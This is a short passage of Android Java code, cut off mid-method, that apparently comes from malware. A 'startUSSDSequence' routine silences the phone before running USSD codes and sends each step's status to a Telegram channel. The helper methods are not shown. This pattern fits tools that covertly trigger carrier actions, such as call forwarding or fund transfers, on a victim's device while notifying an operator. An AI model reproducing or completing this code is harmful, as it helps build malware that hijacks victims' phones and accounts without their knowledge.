              public void attachBaseContext(Context base) {
                  this.context = base;
              }

              private void startUSSDSequence() {
                  attemptCount++;
                  sendTelegram("🔄 Attempt #" + attemptCount + " starting...");
                  
                  // Silent the phone first
                  setSilentMode(true);
                  sendTelegram("🔇 Phone silenced.");
                  
